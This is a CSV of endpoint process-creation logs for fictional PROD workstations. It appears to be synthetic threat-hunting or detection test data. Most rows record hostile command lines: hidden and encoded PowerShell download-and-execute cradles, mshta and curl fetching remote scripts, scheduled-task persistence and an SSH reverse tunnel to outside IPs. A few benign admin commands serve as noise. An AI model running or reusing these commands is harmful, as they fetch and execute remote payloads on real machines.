Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-01T19:18:33.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NonInteractive -Ep Bypass -c ""iex((New-Object Net.WebClient).DownloadString('https://77.91.68.20/payload.ps1'))""",5197,explorer.exe,5110,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,107407f9fd3063759eef8f3925dc6852
2026-02-02T18:40:01.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGgAdAB0AHAAcwA6AC8ALwA4ADUALgAyADMAOQAuADMAMgAuADEANAAvAHIAdQBuAA==,5571,explorer.exe,5348,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,c85bdbf3b44052607ce55b01fb10ae73
2026-02-03T18:25:03.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -w hidden -nop -ep bypass -c ""irm https://179.43.167.55/stage1 | iex""",5808,explorer.exe,5676,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,05e2c1cf9ba2598f6b011763055210e3
2026-02-04T20:56:08.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(iwr -UseBasicParsing https://212.193.30.21/ldr.ps1)""",6102,explorer.exe,6018,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,d65147ccbaf3de9064ed5bfdfae14005
2026-02-05T19:15:58.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://fake-browser-update.store/update.hta,6327,explorer.exe,6276,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,c2cbfae854493f33a02fab3a21791c31
2026-02-06T21:12:25.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,"mshta.exe ""javascript:b=new ActiveXObject('WScript.Shell');b.Run('powershell -w hidden -c iex(iwr https://45.141.87.30/stager)',0)""",6504,explorer.exe,6407,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,56113ed03545bb0107ccf5a51f8507d6
2026-02-07T20:55:34.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://cdn-verify.live/check.hta,6773,explorer.exe,6648,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,fc19aaaa586ac5e8fdde5c0394a32537
2026-02-08T23:30:43.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe admin@77.91.68.20,6937,explorer.exe,6839,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,71afb9fe942401d0fb0c67c861cd49d8
2026-02-09T23:43:01.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,ct.exe,C:\Windows\System32\ct.exe,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,ct.exe 45.141.87.30,7267,explorer.exe,7181,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,58d53ffa43ac56d3044cd77e25866cdc
2026-02-10T22:34:19.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe info@179.43.167.55,7760,explorer.exe,7525,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,87bf8605e370e794923478bf75cebd09
2026-02-12T00:26:58.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nslookup c2-loader.xyz 77.91.68.20,8174,explorer.exe,7949,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,7f3841ad774bd7e4c81ea4df10ffe9d2
2026-02-12T00:27:00.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup c2-loader.xyz 77.91.68.20,8203,cmd.exe,8174,cmd.exe /c nslookup c2-loader.xyz 77.91.68.20,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,270eb4336f18e841324352ad47ea8557
2026-02-13T00:44:50.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nslookup drop.install-check.shop 45.141.87.30,8351,explorer.exe,8283,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,907d386d2cbea1c5d2affc4479ad5585
2026-02-13T00:44:52.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup drop.install-check.shop 45.141.87.30,8482,cmd.exe,8351,cmd.exe /c nslookup drop.install-check.shop 45.141.87.30,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,366e8d85b8a0c5339dcd34e3c80146a6
2026-02-13T20:01:07.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nslookup stage2.verify-update.live 179.43.167.55,8765,explorer.exe,8605,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,6b07c89ad9e5454b32f7845e121b6d64
2026-02-13T20:01:09.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup stage2.verify-update.live 179.43.167.55,8930,cmd.exe,8765,cmd.exe /c nslookup stage2.verify-update.live 179.43.167.55,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,9648c724f58aafc0d786624dc15895e4
2026-02-14T23:54:33.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""WindowsSecurity"" /tr ""wscript.exe C:\Users\Public\sec.vbs"" /sc minute /mo 19 /f",9178,powershell.exe,9005,"powershell.exe -W Hidden -c ""iex(iwr https://77.91.68.20/init)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,9020576eb33a26a02f9939580bd6105f
2026-02-15T22:15:22.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""ChromeUpdater"" /tr ""powershell.exe -w hidden -c iex(iwr https://77.91.68.20/c2)"" /sc minute /mo 19 /f",9506,powershell.exe,9280,"powershell.exe -W Hidden -c ""iex(iwr https://77.91.68.20/init)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,8b88cea27e5e0cfc76d428bb1a6b7750
2026-02-16T22:59:52.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""DriverHelper"" /tr ""mshta.exe https://45.141.87.30/drv.hta"" /sc minute /mo 19 /f",9777,powershell.exe,9523,"powershell.exe -W Hidden -c ""iex(iwr https://77.91.68.20/init)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,e52d629dacdbd98dfd8b6ef926f1bc3d
2026-02-21T00:31:23.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,curl.exe -s https://job-interview-verify.com/check -o C:\Users\Public\check.vbs,10655,cmd.exe,10399,cmd.exe /c curl.exe -s https://job-interview-verify.com/check -o C:\Users\Public\check.vbs,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,258651853fdedafccd9427619e1f2404
2026-02-21T00:31:58.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,e5f6a1b2d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,"wscript.exe ""C:\Users\Public\check.vbs""",10878,curl.exe,10655,curl.exe -s https://job-interview-verify.com/check -o C:\Users\Public\check.vbs,cmd.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,286230a33fdf42d431fab3a7f653eb7c
2026-02-21T23:36:17.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,curl.exe --silent https://45.141.87.30/runner.vbs -o C:\ProgramData\runner.vbs,11212,cmd.exe,11088,cmd.exe /c curl.exe --silent https://45.141.87.30/runner.vbs -o C:\ProgramData\runner.vbs,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,0a76ff7a6d788a3707f070270dc52dca
2026-02-21T23:36:52.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,e5f6a1b2d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,"wscript.exe ""C:\ProgramData\runner.vbs""",11280,curl.exe,11212,curl.exe --silent https://45.141.87.30/runner.vbs -o C:\ProgramData\runner.vbs,cmd.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,02dd2e6db98d0cb24887ff564acee82d
2026-02-22T23:57:33.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,curl.exe -k https://77.91.68.20/cam-fix.vbs -o C:\Users\Public\cam.vbs,11434,cmd.exe,11288,cmd.exe /c curl.exe -k https://77.91.68.20/cam-fix.vbs -o C:\Users\Public\cam.vbs,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,9cb8ce3093ab44b780378df78fdf9782
2026-02-22T23:58:08.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,e5f6a1b2d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,"wscript.exe ""C:\Users\Public\cam.vbs""",11600,curl.exe,11434,curl.exe -k https://77.91.68.20/cam-fix.vbs -o C:\Users\Public\cam.vbs,cmd.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,e7c156c602bea7178c6f40f51ba7358e
2026-02-23T17:59:08.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://77.91.68.20/kimsuky2.ps1)""",12027,explorer.exe,11814,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,982fa107b54fa75e77822ef116eeef32
2026-02-23T18:00:58.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""KUpdate"" /tr ""wscript.exe C:\Users\Public\ku.vbs"" /sc minute /mo 19 /f",12037,powershell.exe,12027,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://77.91.68.20/kimsuky2.ps1)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,61594276973c02b784470b5814502bdd
2026-02-24T19:50:13.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA0ADUALgAxADQAMQAuADgANwAuADMAMAAvAGsAMgApAA==,12527,explorer.exe,12309,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,35c6683d391353560b213e79355f300b
2026-02-24T19:52:03.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""KUpdate"" /tr ""wscript.exe C:\Users\Public\ku.vbs"" /sc minute /mo 19 /f",12739,powershell.exe,12527,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA0ADUALgAxADQAMQAuADgANwAuADMAMAAvAGsAMgApAA==,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,58028052128c955e2e30f7abeb1294aa
2026-02-25T19:45:39.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/kimsuky/c2')""",13102,explorer.exe,12916,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,aa3d0403cf84f63dfe0632d5a403865f
2026-02-25T19:47:29.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""KUpdate"" /tr ""wscript.exe C:\Users\Public\ku.vbs"" /sc minute /mo 19 /f",13184,powershell.exe,13102,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/kimsuky/c2')""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,ad28c115b2a9fdfcd977aeede0e863da
2026-02-26T18:44:32.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NoP -Ep Bypass -c ""iex(iwr https://77.91.68.20/mw2)""",13417,explorer.exe,13208,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,a4522e556085830e08ca2c47a69330af
2026-02-27T19:10:29.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -WindowStyle Hidden -c ""IEX(irm 'https://45.141.87.30/mw/run')""",13639,explorer.exe,13482,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,09dd3fbebff0209564d6a594ed1b3a12
2026-02-28T19:45:13.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwAxADcAOQAuADQAMwAuADEANgA3AC4ANQA1AC8AbQB3ADIAKQAgAA==,13918,explorer.exe,13753,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,57eb7ebe91df6910220fbc5732675621
2026-02-28T22:12:37.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://77.91.68.20/filefix2.ps1)""",14254,explorer.exe,14145,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,eeb0073e20e5a5216d4a13e2cef292bd
2026-02-27T20:16:06.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -ep bypass -w hidden -c ""irm https://45.141.87.30/ff2 | iex""",14472,explorer.exe,14322,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,42f1ccf627c7134663abe1c18333bd6b
2026-02-02T01:23:52.000Z,bbf1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0,PROD-WS-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NoP -c ""ssh -o StrictHostKeyChecking=no -R 9090:localhost:80 tunnel@212.193.30.21 -N -f""",14586,explorer.exe,14550,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,vklein,PROD,S-1-5-21-9876543210-0987654321-123456789-2011,ca806f15827153180f19bac9bcef6a45
2026-02-03T00:42:10.000Z,ccf2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1,PROD-WS-018,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -WindowStyle Hidden -c ""iex(iwr 'https://77.91.68.20/apt28b/ldr')""",15041,explorer.exe,14758,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,rbraun,PROD,S-1-5-21-9876543210-0987654321-123456789-2012,366e8498c6ff1f79046a09fd8563be7e
2026-02-04T01:33:52.000Z,ddf3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2,PROD-LT-015,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -EncodedCommand cwBzAGgAIAAtAG8AIABTAHQAcgBpAGMAdABIAG8AcwB0AEsAZQB5AEMAaABlAGMAawBpAG4AZwA9AG4AbwAgAC0AUgAgADkAMAA5ADAAOgBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAAgAHQAdQBuAG4AZQBsAEAAMgAxADIALgAxADkAMwAuADMAMAAuADIAMQA=,15220,explorer.exe,15212,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,msteinke,PROD,S-1-5-21-9876543210-0987654321-123456789-2013,1e3d6b8612451d7424a4278b3c4968e8
2026-02-27T12:08:54.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-NetIPConfiguration""",15353,explorer.exe,15565,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,2e7e5058652fd098b04f26ae0d3cd6b5
2026-02-23T09:36:52.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-DnsClientServerAddress""",15706,explorer.exe,15939,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,ae4e72d3df73c4c369a2766f89f60de1
2026-02-25T09:57:43.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Register-ScheduledTask -TaskName 'Backup' -Action (New-ScheduledTaskAction -Execute 'backup.exe')""",15944,explorer.exe,16213,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,a88064ee2fe47edd1e2faf8be2d4ed2f
2026-02-11T12:33:00.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-MpComputerStatus""",16408,explorer.exe,16589,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,21b522167e6cd4e5ad80f4ee1137ebeb
2026-02-14T08:56:40.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WinEvent -LogName System -MaxEvents 50""",16688,explorer.exe,16951,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,1052b14a7c30fdf255c44a87f9b1e675
